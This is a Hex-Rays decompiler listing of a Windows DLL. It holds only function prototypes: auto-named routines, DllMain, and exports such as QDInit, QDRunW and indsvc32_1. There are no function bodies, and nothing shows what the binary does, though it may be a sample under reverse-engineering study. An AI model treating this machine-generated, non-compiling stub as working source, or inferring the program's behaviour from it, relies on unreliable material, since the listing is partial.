/* This file was generated by the Hex-Rays decompiler version 7.7.0.220118.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

void *__thiscall sub_10001000(int *this);
int *__thiscall sub_10001029(int *Block, char a2);
_DWORD *__stdcall sub_10001045(_DWORD *a1);
void *__thiscall sub_10001124(volatile LONG *this, void *a2, int a3);
// LONG *__usercall sub_10001236@<eax>(LONG *a1@<eax>, LONG *a2@<ecx>);
char *__thiscall sub_10001257(char *Block, char a2);
// LONG __usercall sub_100012A0@<eax>(LONG *a1@<edi>);
_DWORD *__thiscall sub_1000132C(_DWORD *this);
BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
char sub_100013CC();
// void __usercall sub_100015E4(int a1@<edi>, int a2, int a3, int a4, int a5, int *a6, int a7, int a8, int a9, int a10, int a11, int a12);
void __stdcall sub_100016A1(int a1);
char __thiscall sub_100016E6(void **this);
void __stdcall sub_10002F79(int *a1);
void __stdcall sub_1000308F(int a1);
void __thiscall sub_100030C4(_DWORD *this);
void __thiscall sub_10003111(int *this);
void sub_10003155();
char __cdecl sub_10004EEB(int a1);
int SetObjectDescriptor();
int __cdecl QDInit(void **a1);
void (__cdecl *__stdcall QDRunW(int a1, int a2, wchar_t *String, int a4))(unsigned int, struct _EXCEPTION_POINTERS *);
_DWORD *__thiscall sub_10005138(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100051A2(void *this, _DWORD *a2, _DWORD *a3);
void __thiscall sub_1000522C(int *this);
void *__thiscall sub_10005258(_DWORD *this);
int __thiscall sub_10005293(_DWORD *this);
bool __thiscall sub_10005297(void *this, void *a2);
char __thiscall sub_100052E1(_DWORD *this, void *a2);
int __thiscall sub_10005357(void *this, void *a2);
int __thiscall sub_100053DE(void *this, int a2);
void *__thiscall sub_10005427(void *this, int a2, _DWORD *a3);
void __fastcall sub_10005474(int a1, int a2);
_DWORD *__thiscall sub_1000547E(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100054EC(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10005579(void *this, _DWORD *a2);
int __thiscall sub_100055D3(_DWORD *this, void *a2, _DWORD *a3, char a4);
BOOL __thiscall sub_10005722(void *this);
_DWORD *__thiscall sub_1000572D(void *this, _DWORD *a2, void *Block);
void __thiscall sub_100057B7(_DWORD *this);
_DWORD *__thiscall sub_1000581D(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10005883(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_100058E9(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000594F(_DWORD *this, _DWORD *a2);
void *__thiscall sub_100059B5(_DWORD *this);
int *__thiscall sub_100059D9(void *this, int *a2, unsigned int a3);
void __thiscall sub_10005A4D(void *this, int a2);
void __thiscall sub_10005A8B(void *this, int a2, int a3);
void __thiscall sub_10005ACC(void *this, int a2);
int __thiscall sub_10005B0A(void *this, int a2);
void __thiscall sub_10005B4E(void *this);
_DWORD *__thiscall sub_10005B95(_DWORD *Block, char a2);
int *__stdcall sub_10005BB1(int *Block);
void __fastcall sub_10005BE1(unsigned int a1, int a2, int a3);
void *__thiscall sub_10005C4A(void *this, unsigned int a2);
int *__thiscall sub_10005CC1(void *this, int a2, int *a3);
int *__thiscall sub_10005D78(void *this, int a2, int *a3);
// unsigned int __userpurge sub_10005E2F@<eax>(int a1@<ebx>, int a2);
BOOL __thiscall sub_10005E90(_DWORD *this);
int __thiscall sub_10005E9A(int this, int a2);
void __thiscall sub_10005EB3(int *this);
int __thiscall sub_10005EEF(_DWORD **this);
int __thiscall sub_10005EFB(int *this);
void __noreturn sub_10005F06(); // weak
void __noreturn sub_10005F2B();
int __thiscall sub_10005F50(_DWORD **this);
int __thiscall sub_10005F58(_DWORD **this);
int __thiscall sub_10005F60(_DWORD **this);
int __thiscall sub_10005F6C(int *this);
void __noreturn sub_10005F77();
void __noreturn sub_10005F9C();
_DWORD *__stdcall sub_10005FC1(_DWORD *a1, int a2);
BOOL __thiscall sub_10006043(int this);
int __thiscall sub_1000606E(_DWORD **this);
int __thiscall sub_100060B2(_DWORD *this);
int __thiscall sub_100060CB(int *this);
void __noreturn sub_10006154();
void __noreturn sub_10006179();
int __thiscall sub_1000619E(int this);
int __thiscall sub_100061EB(int this);
int __thiscall sub_10006233(_DWORD *this);
int __thiscall sub_1000626D(int this);
BOOL __thiscall sub_100062BA(_DWORD *this);
int __thiscall sub_100062C3(_DWORD *this);
int __thiscall sub_10006302(_DWORD *this);
int *__thiscall sub_10006341(int this);
_DWORD *__thiscall sub_100063C9(_DWORD *this, _DWORD *a2);
void __thiscall sub_10006456(_DWORD *this);
void __thiscall sub_1000646B(int *this);
int *__thiscall sub_100064A0(int *Block, char a2);
void **__thiscall sub_100064BC(void **this, char a2);
int __thiscall sub_100064F7(int this, char a2);
_DWORD *__thiscall sub_1000654F(_DWORD *this, _DWORD *a2);
// _DWORD *__userpurge sub_100065B6@<eax>(int a1@<esi>, _DWORD *a2);
// void __usercall sub_10006610(int a1@<ecx>, int a2@<edi>);
// int __usercall sub_10006682@<eax>(int a1@<ecx>, int a2@<esi>);
void __thiscall sub_100066C2(_DWORD *this);
// int __usercall sub_10006700@<eax>(_DWORD *a1@<esi>);
_DWORD *__stdcall sub_10006776(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
bool __thiscall sub_100067BE(int this);
void __thiscall sub_100067D5(_DWORD *this);
_DWORD *__stdcall sub_10006814(_DWORD *a1);
int *__thiscall sub_10006851(int *this, int *a2);
void *__thiscall sub_100068A5(_DWORD *this);
void __thiscall sub_10006917(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_100069AE(_DWORD *this, unsigned int a2);
int __thiscall sub_10006A09(_DWORD *this, int a2);
int __thiscall sub_10006A27(_DWORD *this, int a2);
void __thiscall sub_10006A45(_DWORD *this, unsigned int a2);
int __thiscall sub_10006A7D(int *this);
int __thiscall sub_10006AB6(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10006AFF(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10006B71(_DWORD *this, int a2, int a3, int a4);
void *__thiscall sub_10006C23(_DWORD *this);
_DWORD *__stdcall sub_10006D46(_DWORD *a1);
int *__thiscall sub_10006D81(int *this, int *a2);
void *__thiscall sub_10006DC3(_DWORD *this);
void __thiscall sub_10006E24(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_10006EF0(_DWORD *this, unsigned int a2);
int __thiscall sub_10006F5E(_DWORD *this, int a2);
int __thiscall sub_10006F7D(_DWORD *this, int a2);
char *__thiscall sub_10006F9C(_DWORD *this, char *a2);
int __thiscall sub_10006FC2(int *this);
int __thiscall sub_10006FE9(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10007041(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __stdcall sub_100070BD(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_100070CE(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_10007182(_DWORD *this);
// _DWORD *__userpurge sub_1000728E@<eax>(_DWORD *a1@<esi>, int a2);
_DWORD *__stdcall sub_100072D2(_DWORD *a1);
void *__thiscall sub_1000730D(_DWORD *this);
void __thiscall sub_1000737F(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_10007469(int *this, int a2);
int __thiscall sub_10007481(_DWORD *this, unsigned int a2);
int __thiscall sub_100074EC(_DWORD *this, int a2);
int __thiscall sub_1000750B(_DWORD *this, int a2);
int __thiscall sub_1000752A(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1000757C(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_100075F8(_DWORD *this, int a2, int a3, int a4);
void *__thiscall sub_100076A9(_DWORD *this);
// _DWORD *__usercall sub_100077CD@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_1000780D(void *); // idb
void __stdcall sub_10007846(int a1);
void __cdecl __noreturn sub_10007882(int pExceptionObject);
void __thiscall sub_100078A2(void **this);
void __cdecl __noreturn sub_100078FE(int pExceptionObject);
// _DWORD *__userpurge sub_1000791E@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10007972(_DWORD *a1);
void **__thiscall sub_100079AD(void **this, void **a2);
void *__thiscall sub_100079EC(int this);
int __thiscall sub_10007A4A(_DWORD *this);
int __thiscall sub_10007A4E(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_10007AB1(_DWORD *this, unsigned int a2);
int __thiscall sub_10007AFA(_DWORD *this, int a2);
int __thiscall sub_10007B18(_DWORD *this, int a2);
void __thiscall sub_10007B36(_DWORD *this, unsigned int a2);
int __thiscall sub_10007B58(void **this);
int __thiscall sub_10007B7C(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10007BBB(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10007C2D(void *this, unsigned int a2, int a3);
unsigned int __thiscall sub_10007C67(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_10007CC4(_DWORD *this);
void __thiscall sub_10007D7A(void **this);
void __cdecl __noreturn sub_10007DD5(int a1, int a2);
_DWORD *__thiscall sub_10007DF9(_DWORD *Block, char a2);
void __thiscall sub_10007E15(_DWORD *this);
_DWORD *__thiscall sub_10007E21(_DWORD *Block, char a2);
// char *__usercall sub_10007E3D@<eax>(char *a1@<eax>);
// LONG *__usercall sub_10007E5B@<eax>(int a1@<eax>, LONG *a2@<esi>);
char *__thiscall sub_10007E84(char *Block, char a2);
// char *__usercall sub_10007ECD@<eax>(char *a1@<eax>);
_DWORD *__thiscall sub_10007EEB(_DWORD *Block, char a2);
char *__thiscall sub_10007F07(char *Block, char a2);
// char *__usercall sub_10007F50@<eax>(char *a1@<eax>);
_DWORD *__thiscall sub_10007F6E(_DWORD *this, int a2);
void *__thiscall sub_10007FA6(void *Block, char a2);
_DWORD *__thiscall sub_10007FC2(_DWORD *this, int a2, int a3);
_DWORD *__thiscall sub_1000802B(_DWORD *Block, char a2);
char *__thiscall sub_10008047(_DWORD *this, char a2);
void __thiscall sub_10008066(_DWORD *this);
// _DWORD *__userpurge sub_1000809E@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
// void __usercall sub_100080F2(_DWORD *a1@<edi>, int a2@<esi>);
// void __usercall sub_1000815F(_DWORD *a1@<edi>);
// void __usercall sub_100081D1(int a1@<esi>);
// void __usercall sub_100081F9(_DWORD *a1@<edi>);
// void __usercall sub_10008269(int a1@<eax>);
// void *__usercall sub_10008295@<eax>(int a1@<eax>, _DWORD *a2@<esi>);
void **__stdcall sub_100082B5(void **Block);
void __thiscall sub_10008301(void **this);
void __thiscall sub_10008338(void **this);
int __thiscall sub_1000838A(_DWORD *this, int a2);
int __cdecl indsvc32_1(char *String, HANDLE hSourceHandle, int a3, _DWORD *a4, _DWORD *a5);
int __cdecl indsvc32_2(void *a1, HANDLE hSourceHandle, int a3, _DWORD *a4, _DWORD *a5, void *a6);
int __cdecl sub_1000856F(int a1, _DWORD *a2, size_t *a3);
int __cdecl sub_10008725(void *Block); // idb
int sub_10008797();
int *sub_10008800(int *a1, wchar_t a2, ...);
int __cdecl sub_100088B5(int a1);
void __stdcall sub_10008B27(int *a1);
int sub_10008B83(HANDLE hSourceHandle, _DWORD *a2, _DWORD *a3, ...);
_DWORD *__thiscall sub_1000990F(void *this, _DWORD *a2);
int __thiscall sub_1000996F(void *this, int a2);
void __thiscall sub_100099A2(_DWORD *this);
void *__thiscall sub_10009A08(void *this, int a2);
int __thiscall sub_10009A1A(_DWORD *this);
_DWORD *__thiscall sub_10009A1E(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10009A84(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10009AEA(void *this, _DWORD *a2, unsigned int a3);
int *__thiscall sub_10009B80(void *this, int *a2, unsigned int a3);
void __thiscall sub_10009BF4(void *this, int a2);
void __thiscall sub_10009C32(void *this, int a2, int a3);
void __thiscall sub_10009C73(void *this, int a2);
int __thiscall sub_10009CB1(void *this, int a2);
int __thiscall sub_10009CF5(void *this, int a2);
void __thiscall sub_10009D39(void *this);
int *__stdcall sub_10009D80(int *Block);
void __stdcall sub_10009DB0(int *a1);
// void __usercall sub_10009DE4(int a1@<ecx>, int a2@<edi>);
// int __usercall sub_10009E64@<eax>(int a1@<ecx>, int a2@<esi>);
BOOL __thiscall sub_10009EA4(_DWORD *this);
int __thiscall sub_10009EAD(_DWORD *this);
int __thiscall sub_10009EE3(_DWORD *this);
int __thiscall sub_10009F22(_DWORD *this);
int *__thiscall sub_10009F61(int this);
_DWORD *__thiscall sub_10009FE9(_DWORD *this, void *a2);
_DWORD *__thiscall sub_1000A076(void *this, _DWORD *a2);
_DWORD *__stdcall sub_1000A0D2(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7);
void __thiscall sub_1000A11B(_DWORD *this);
bool __thiscall sub_1000A159(_DWORD *this);
void __thiscall sub_1000A198(HANDLE *this, HANDLE hSourceHandle, char a3, BOOL bInheritHandle, DWORD dwProcessId, DWORD a6);
// _DWORD *__usercall sub_1000A205@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>);
// _DWORD *__usercall sub_1000A219@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>);
// _DWORD *__userpurge sub_1000A23E@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_1000A292(_DWORD *a1);
int *__thiscall sub_1000A2CF(int *this, int *a2);
void *__thiscall sub_1000A311(_DWORD *this);
void __thiscall sub_1000A372(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_1000A40F(_DWORD *this, unsigned int a2);
int __thiscall sub_1000A466(_DWORD *this, int a2);
int __thiscall sub_1000A484(_DWORD *this, int a2);
char *__thiscall sub_1000A4A2(_DWORD *this, char *a2);
int __thiscall sub_1000A4C8(int *this);
int __thiscall sub_1000A4EF(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_1000A539(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_1000A5AB(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_1000A65B(_DWORD *this);
void sub_1000A771();
// volatile LONG *__usercall sub_1000A7A8@<eax>(int a1@<esi>);
_DWORD *__thiscall sub_1000A7F8(_DWORD *Block, char a2);
void __thiscall sub_1000A814(_DWORD *this);
_DWORD *__thiscall sub_1000A829(_DWORD *Block, char a2);
void __thiscall sub_1000A845(_DWORD *this);
char *__thiscall sub_1000A851(char *Block, char a2);
// char *__usercall sub_1000A89A@<eax>(char *a1@<eax>);
char *__thiscall sub_1000A8B8(char *Block, char a2);
_DWORD *__stdcall sub_1000A901(_DWORD *a1);
// bool __usercall sub_1000A926@<al>(int a1@<esi>);
void __cdecl __noreturn sub_1000A947(_DWORD *a1, int a2);
// void __usercall sub_1000A96C(_DWORD *a1@<edi>, int a2@<esi>);
void sub_1000A9D9();
_DWORD *__thiscall sub_1000AA0A(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_1000AA7B(_DWORD *this, char a2);
// BOOL __usercall sub_1000AA9A@<eax>(int a1@<eax>);
int __stdcall sub_1000AAAD(int a1, _DWORD *a2);
void *__thiscall sub_1000AB3C(void *Block, char a2);
void __thiscall sub_1000AB59(int this, void *a2);
_DWORD *__thiscall sub_1000ABE4(int this);
char __thiscall sub_1000AC2D(_BYTE *this);
void *__thiscall sub_1000AC31(_BYTE *this);
void *__thiscall sub_1000AC66(_BYTE *this);
int __thiscall sub_1000AC9B(int this);
int __thiscall sub_1000ACD3(int this);
_DWORD *__thiscall sub_1000AD14(void *this, _DWORD *a2);
int __thiscall sub_1000AD4B(int this);
void __thiscall sub_1000AD86(_DWORD *this, void *a2);
// _DWORD *__usercall sub_1000AD9F@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_1000ADE9(_DWORD *a1);
int *__thiscall sub_1000AE1D(int *Block, char a2);
void __thiscall sub_1000AE39(int *this);
int __thiscall sub_1000AE67(void *this);
_DWORD *__stdcall sub_1000AE6C(_DWORD *a1, int a2, volatile LONG *lpAddend);
void *__thiscall sub_1000AEC2(void *Block, char a2);
void __thiscall sub_1000AEDE(int this);
int __stdcall sub_1000AF19(int a1);
int __thiscall sub_1000B0AF(void *this);
// LONG __usercall sub_1000B119@<eax>(int a1@<esi>);
// int __userpurge sub_1000B134@<eax>(void *a1@<eax>, int a2@<ecx>, void *a3);
_DWORD *__thiscall sub_1000B157(_DWORD *Block, char a2);
void __stdcall sub_1000B177(_DWORD *a1);
// void *__userpurge sub_1000B1C2@<eax>(void *result@<eax>, int a2@<esi>, void *Src);
// int __userpurge sub_1000B1F3@<eax>(void *a1@<ebx>, int a2, void *a3);
// int __userpurge sub_1000B261@<eax>(int a1@<ebx>, int a2, char a3);
// int __userpurge sub_1000B2FA@<eax>(_DWORD *a1@<ebx>, int a2, int a3, int a4, void *Block);
// int __userpurge sub_1000B36F@<eax>(_DWORD *a1@<ebx>, int a2);
// int __usercall sub_1000B3BD@<eax>(LONG *a1@<edi>, int a2@<esi>);
void __thiscall sub_1000B3DF(int *this);
// void *__usercall sub_1000B40C@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_1000B49B@<eax>(_DWORD *a1@<eax>, int a2@<ecx>);
int __thiscall sub_1000B4B8(_DWORD *this);
// int __userpurge sub_1000B4CB@<eax>(int a1@<eax>, int a2@<ecx>, int a3);
bool __fastcall sub_1000B4E7(_DWORD *a1, _DWORD *a2);
// int __usercall sub_1000B544@<eax>(_DWORD *a1@<ecx>, int a2@<esi>);
// int __usercall sub_1000B63D@<eax>(_DWORD *a1@<ebx>, int a2, _DWORD *a3);
// int __userpurge sub_1000B67C@<eax>(_DWORD *a1@<ebx>, int a2, int a3, int a4);
// int __userpurge sub_1000B6B7@<eax>(_DWORD *a1@<ebx>, int a2, int a3, int a4);
int __thiscall sub_1000B6F2(_DWORD *this, int a2);
// _BYTE *__userpurge sub_1000B713@<eax>(int a1@<ecx>, _DWORD *a2@<esi>, int a3, int Src);
__int16 __thiscall sub_1000B746(_DWORD *this, int a2);
// _BYTE *__userpurge sub_1000B768@<eax>(int a1@<ecx>, _DWORD *a2@<esi>, int a3, __int16 Src);
// _BYTE *__usercall sub_1000B79B@<eax>(int a1@<ecx>, _DWORD *a2@<esi>);
// LONG *__usercall sub_1000B7C9@<eax>(LONG *a1@<eax>, LONG *a2@<ecx>);
// LONG __userpurge sub_1000B7EC@<eax>(LONG *a1@<edi>, void *Block);
_DWORD *__thiscall sub_1000B85E(_DWORD *Block, char a2);
_DWORD *__cdecl sub_1000B87D(_DWORD *a1);
_DWORD *__cdecl sub_1000B964(_DWORD *a1);
// _DWORD *__usercall sub_1000B9C0@<eax>(int a1@<esi>);
void __thiscall sub_1000B9EB(_DWORD *this);
_DWORD *__cdecl sub_1000BA38(_DWORD *a1);
// _DWORD *__userpurge sub_1000BA6E@<eax>(int a1@<ebx>, int a2@<edi>, _DWORD *a3, int a4, int a5, int a6, int a7, volatile LONG *lpAddend);
void *__thiscall sub_1000BB35(void *Block, char a2);
void __thiscall sub_1000BB54(int this);
char __thiscall sub_1000BBC2(_DWORD *this);
void __thiscall sub_1000BCC4(_DWORD *this);
void __thiscall sub_1000BCD7(_DWORD *this);
int __thiscall sub_1000BCEA(HANDLE *this);
BOOL __thiscall sub_1000BD52(_DWORD *this);
char *__thiscall sub_1000BD5C(char *this);
LONG *__thiscall sub_1000BD60(_DWORD *this, LONG *a2);
_DWORD *__thiscall sub_1000BE40(_DWORD *this, _DWORD *a2);
int __thiscall sub_1000BE83(_DWORD *this);
int __thiscall sub_1000BE87(_DWORD *this);
// int __userpurge sub_1000BE8B@<eax>(HANDLE *a1@<esi>, FILETIME *lpCreationTime, FILETIME *lpLastAccessTime, FILETIME *lpLastWriteTime);
_QWORD *__thiscall sub_1000BEFE(HANDLE *this, _QWORD *a2, int a3);
int __thiscall sub_1000BF3F(HANDLE *this, FILETIME *lpFileTime, int a3);
_QWORD *__thiscall sub_1000BF90(HANDLE *this, _QWORD *a2, int a3);
int __thiscall sub_1000BFCF(HANDLE *this, FILETIME *lpFileTime, int a3);
_QWORD *__thiscall sub_1000C022(HANDLE *this, _QWORD *a2, int a3);
int __thiscall sub_1000C061(HANDLE *this, FILETIME *lpFileTime, int a3);
DWORD __thiscall sub_1000C0B4(HANDLE *this);
BOOL __thiscall sub_1000C19E(void *this, DWORD dwFileAttributes);
DWORD __thiscall sub_1000C225(HANDLE *this);
// BOOL __userpurge sub_1000C301@<eax>(HANDLE *a1@<ecx>, struct _FILETIME *a2@<ebx>, struct _FILETIME *a3@<edi>, struct _FILETIME *lpCreationTime);
struct _FILETIME __cdecl sub_1000C407(FILETIME *lpFileTime, int a2, int a3);
__int16 __thiscall sub_1000C48B(void *this);
DWORD __thiscall sub_1000C4F4(HANDLE *this, _DWORD *a2);
void __thiscall sub_1000C5BE(void *this, char a2);
int __thiscall sub_1000C60A(HANDLE *this, _DWORD *a2);
int __thiscall sub_1000C6B3(void *this, int a2, int a3);
DWORD __thiscall sub_1000C6CA(HANDLE *this, LONG lDistanceToMove, int a3, DWORD dwMoveMethod);
DWORD __thiscall sub_1000C785(HANDLE *this);
int __thiscall sub_1000C822(void *this);
BOOL __thiscall sub_1000C827(HANDLE *this);
BOOL __thiscall sub_1000C8A5(HANDLE *this);
void __cdecl __noreturn sub_1000C923(_DWORD *a1, int a2);
void __cdecl __noreturn sub_1000C948(_DWORD *a1, int a2);
void __cdecl __noreturn sub_1000C96D(_DWORD *a1, int a2);
void __cdecl __noreturn sub_1000C992(_DWORD *a1);
_DWORD *__thiscall sub_1000C9BE(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_1000CA3E(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_1000CADA(_DWORD *this, int a2, int a3);
char *__thiscall sub_1000CB43(_DWORD *this, char a2);
char *__thiscall sub_1000CB65(_DWORD *this, char a2);
char *__thiscall sub_1000CB87(_DWORD *this, char a2);
void __thiscall sub_1000CBA9(_DWORD *this);
// int __usercall sub_1000CBBE@<eax>(int result@<eax>, int a2@<edx>);
int __cdecl sub_1000CBFA(int a1);
int __cdecl sub_1000CC40(int a1);
// errno_t __userpurge sub_1000CC86@<eax>(int a1@<esi>, wchar_t *String);
_DWORD *__cdecl sub_1000CCFC(_DWORD *a1);
// _DWORD *__userpurge sub_1000CDC9@<eax>(int a1@<edi>, _DWORD *a2);
void *__thiscall sub_1000CE46(void *this, void *a2);
errno_t __thiscall sub_1000CE8E(int this, wchar_t *String, wchar_t *Source);
// int __usercall sub_1000CF41@<eax>(unsigned int a1@<eax>, int a2@<esi>);
void **__thiscall sub_1000CFA5(void **Block, char a2);
// int __userpurge sub_1000CFC4@<eax>(int a1@<eax>, wchar_t *String);
// int __userpurge sub_1000CFE7@<eax>(int a1@<esi>, char *String, UINT CodePage, size_t MaxCount);
// void *__usercall sub_1000D089@<eax>(int a1@<esi>);
void __thiscall sub_1000D12C(void **this);
_DWORD *__stdcall sub_1000D17D(_DWORD *a1, wchar_t *String);
_DWORD *__stdcall sub_1000D1D6(_DWORD *a1, unsigned int a2);
// _DWORD *__userpurge sub_1000D230@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
_DWORD *__cdecl sub_1000D2FA(_DWORD *a1, UINT CodePage);
_DWORD *__stdcall sub_1000D372(_DWORD *a1, int a2);
void __thiscall sub_1000D3AD(int *this);
// int __usercall sub_1000D3DA@<eax>(int a1@<edi>);
_DWORD *__cdecl sub_1000D3EB(_DWORD *a1, char *String);
__int16 __fastcall sub_1000D45C(unsigned int a1, int a2, int a3);
char __thiscall sub_1000D4A1(LONG *this);
// int __usercall sub_1000D52B@<eax>(int a1@<ecx>, unsigned int a2@<edi>, LONG *a3@<esi>);
// int __userpurge sub_1000D575@<eax>(int a1@<ebx>, _DWORD *a2);
_DWORD *__cdecl sub_1000D5FF(_DWORD *a1, int a2, _DWORD *a3);
// BOOL __usercall sub_1000D641@<eax>(int a1@<eax>, int a2@<ecx>);
// bool __usercall sub_1000D64D@<al>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_1000D65C@<eax>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_1000D679@<eax>(LONG *a1@<esi>);
// size_t __usercall sub_1000D687@<eax>(int a1@<eax>);
// size_t __usercall sub_1000D699@<eax>(int a1@<eax>);
// int __usercall sub_1000D6AC@<eax>(int a1@<esi>);
// int __usercall sub_1000D6C3@<eax>(int a1@<esi>, wchar_t *Format, ...);
_DWORD *__cdecl sub_1000D74C(_DWORD *a1, int ArgList);
_DWORD *__cdecl sub_1000D7AD(_DWORD *a1, int ArgList);
// unsigned int __usercall sub_1000D80E@<eax>(int a1@<eax>);
// unsigned int __usercall sub_1000D822@<eax>(int a1@<eax>);
_DWORD *__fastcall sub_1000D836(int a1, int a2, _DWORD *a3, unsigned int a4);
// LONG *__usercall sub_1000D948@<eax>(LONG *a1@<eax>);
// LONG *__usercall sub_1000D984@<eax>(LONG *a1@<eax>);
// LONG *__usercall sub_1000D9B4@<eax>(LONG *a1@<eax>);
// LONG *__userpurge sub_1000D9E4@<eax>(int a1@<eax>, _DWORD *a2@<ecx>, LONG *a3, unsigned int a4);
int __thiscall sub_1000DA16(_DWORD *this, int a2, int a3, unsigned int a4);
// LONG *__userpurge sub_1000DD58@<eax>(LONG *a1@<ecx>, int a2@<ebx>, int a3, unsigned int a4);
// LONG *__usercall sub_1000DE34@<eax>(unsigned int a1@<eax>, LONG *a2@<ecx>);
// BOOL __usercall sub_1000DE70@<eax>(int a1@<eax>, int a2@<ecx>);
// int __userpurge sub_1000DE8B@<eax>(unsigned int a1@<ecx>, int a2@<esi>, wchar_t a3);
// int __userpurge sub_1000DEE8@<eax>(int a1@<esi>, wchar_t a2);
// int __userpurge sub_1000DF11@<eax>(unsigned int a1@<edx>, int a2@<esi>, int a3);
int __stdcall sub_1000DF75(int a1, int a2, unsigned int a3);
// BOOL __userpurge sub_1000E007@<eax>(int a1@<esi>, int a2);
_DWORD *__stdcall sub_1000E01F(_DWORD *a1, int a2, int a3);
void __thiscall sub_1000E091(int *this);
int *__thiscall sub_1000E0F2(int *Block, char a2);
// int __usercall sub_1000E111@<eax>(int a1@<ebx>);
// LONG *__usercall sub_1000E1F7@<eax>(int a1@<edi>, LONG *a2);
int __thiscall sub_1000E3AE(int this);
int __thiscall sub_1000E3FB(int this);
int __thiscall sub_1000E443(_DWORD *this);
int __thiscall sub_1000E47D(int this);
_DWORD *__thiscall sub_1000E4CA(_DWORD *Block, char a2);
void *__thiscall sub_1000E4EA(int this);
int __thiscall sub_1000E548(_DWORD *this, int *a2, unsigned int a3);
int __thiscall sub_1000E5AB(_DWORD *this, unsigned int a2);
int __thiscall sub_1000E5F7(_DWORD *this, int a2);
int __thiscall sub_1000E618(_DWORD *this, int a2);
unsigned int __thiscall sub_1000E639(_DWORD *this, unsigned int a2, int a3, int a4);
void *__thiscall sub_1000E6AB(void *Block, char a2);
_DWORD *__stdcall sub_1000E6CA(_DWORD *a1);
// void *__usercall sub_1000E6EF@<eax>(int a1@<eax>, _DWORD *a2@<esi>);
int __cdecl sub_1000E70F(unsigned int a1);
void sub_1000E73C();
LPVOID sub_1000E758();
void __cdecl sub_1000E785(LPVOID lpTlsValue);
_DWORD *__thiscall sub_1000E7B3(_DWORD *this, int a2);
_DWORD *__thiscall sub_1000E7D8(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1000E7F7(_DWORD *this, char a2, int a3);
void __thiscall sub_1000E843(_DWORD *this);
int __stdcall sub_1000E88D(int a1, char a2, int a3);
_DWORD *__stdcall sub_1000E8EF(_DWORD *a1);
void __thiscall sub_1000E927(_DWORD *this);
int __stdcall sub_1000E950(int a1);
_DWORD *__stdcall sub_1000E9A1(_DWORD *a1, int a2);
_DWORD *__thiscall sub_1000E9DF(_DWORD *this, char a2, int a3);
// int __usercall sub_1000EA57@<eax>(int a1@<esi>);
void (__cdecl **__thiscall sub_1000EA76(void (__cdecl **Block)(unsigned int, struct _EXCEPTION_POINTERS *), char a2))(unsigned int, struct _EXCEPTION_POINTERS *);
void (__cdecl *__thiscall sub_1000EA95(void (__cdecl **this)(unsigned int, struct _EXCEPTION_POINTERS *)))(unsigned int, struct _EXCEPTION_POINTERS *);
void __cdecl __noreturn sub_1000EAE1(unsigned int a1, struct _EXCEPTION_POINTERS *a2);
// _DWORD *__usercall sub_1000EB36@<eax>(_DWORD *a1@<esi>);
_DWORD *__thiscall sub_1000EB4D(_DWORD *Block, char a2);
UINT __thiscall sub_1000EB6C(_DWORD *this);
void __cdecl __noreturn sub_1000EBAD();
// _DWORD *__usercall sub_1000EBF7@<eax>(_DWORD *a1@<esi>);
void *__thiscall sub_1000EC19(void *Block, char a2);
int __thiscall sub_1000EC38(void *this);
// int __usercall sub_1000EC84@<eax>(_DWORD *a1@<esi>);
// char __usercall sub_1000ECB1@<al>(int *a1@<esi>);
char __thiscall sub_1000ED47(_BYTE *this);
bool __thiscall sub_1000ED4B(_BYTE *this);
// _DWORD *__usercall sub_1000ED72@<eax>(int a1@<ecx>, _DWORD *a2@<esi>);
_DWORD **__thiscall sub_1000ED85(_DWORD **Block, char a2);
int __thiscall sub_1000EDA4(_DWORD **this);
